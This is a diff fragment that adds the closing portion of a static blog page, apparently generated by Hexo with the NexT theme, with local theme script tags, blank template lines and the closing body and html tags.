+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
